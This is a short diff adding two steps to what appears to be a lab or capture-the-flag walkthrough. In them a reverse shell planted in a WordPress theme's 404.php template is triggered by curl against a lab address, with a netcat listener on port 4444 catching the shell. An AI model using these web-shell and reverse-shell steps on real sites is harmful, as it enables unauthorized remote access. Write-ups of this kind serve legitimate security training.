@@ -565,3 +565,14 @@ function printit ($string) {
 
 ?>
 ```
+
+12. After updating the file, we will start a netcat listener on port 4444
+
+`nc -lvnp 4444`
+
+13. Then run the 404 template using cURL
+
+`curl http://10.10.110.100:65000/wordpress/wp-content/themes/twentyseventeen/404.php`
+
+And we get the reverse shell!
+
